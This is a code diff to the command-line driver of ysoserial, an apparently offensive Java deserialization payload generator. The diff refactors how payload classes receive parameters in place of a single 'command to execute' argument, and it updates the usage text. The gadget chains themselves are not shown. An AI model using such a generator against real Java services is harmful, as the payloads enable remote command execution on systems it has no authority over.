@@ -7,8 +7,8 @@ import java.util.Collections;
 import java.util.Comparator;
 import java.util.List;
 
-import ysoserial.payloads.ObjectPayload;
-import ysoserial.payloads.ObjectPayload.Utils;
+import ysoserial.interfaces.ObjectPayload;
+import ysoserial.payloads.Utils;
 import ysoserial.payloads.annotation.Dependencies;
 
 @SuppressWarnings("rawtypes")
@@ -18,12 +18,11 @@ public class GeneratePayload {
 	private static final int USAGE_CODE = 64;
 
 	public static void main(final String[] args) {
-		if (args.length != 2) {
+		if (args.length < 2) {
 			printUsage();
 			System.exit(USAGE_CODE);
 		}
 		final String payloadType = args[0];
-		final String command = args[1];
 
 		final Class<? extends ObjectPayload> payloadClass = Utils.getPayloadClass(payloadType);
 		if (payloadClass == null) {
@@ -32,13 +31,18 @@ public class GeneratePayload {
 			System.exit(USAGE_CODE);
 			return; // make null analysis happy
 		}
+		
+		String[] newArgs = new String[ args.length - 1 ];
+		System.arraycopy( args, 1, newArgs, 0, newArgs.length );
 
 		try {
 			final ObjectPayload payload = payloadClass.newInstance();
-			final Object object = payload.getObject(command);
+			Utils.wire( payload, newArgs );
+			
+			final Object object = payload.getObject();
 			PrintStream out = System.out;
 			Serializer.serialize(object, out);
-			ObjectPayload.Utils.releasePayload(payload, object);
+			Utils.releasePayload(payload, object);
 		} catch (Throwable e) {
 			System.err.println("Error while generating or serializing payload");
 			e.printStackTrace();
@@ -49,10 +53,10 @@ public class GeneratePayload {
 
 	private static void printUsage() {
 		System.err.println("Y SO SERIAL?");
-		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'");
+		System.err.println("Usage: java -jar ysoserial-[version]-all.jar [payload type] [params...]");
 		System.err.println("\tAvailable payload types:");
 		final List<Class<? extends ObjectPayload>> payloadClasses =
-			new ArrayList<Class<? extends ObjectPayload>>(ObjectPayload.Utils.getPayloadClasses());
+			new ArrayList<Class<? extends ObjectPayload>>(Utils.getPayloadClasses());
 		Collections.sort(payloadClasses, new ToStringComparator()); // alphabetize
 		for (Class<? extends ObjectPayload> payloadClass : payloadClasses) {
 			System.err.println("\t\t" + payloadClass.getSimpleName() + " " + Arrays.asList(Dependencies.Utils.getDependencies(payloadClass)));
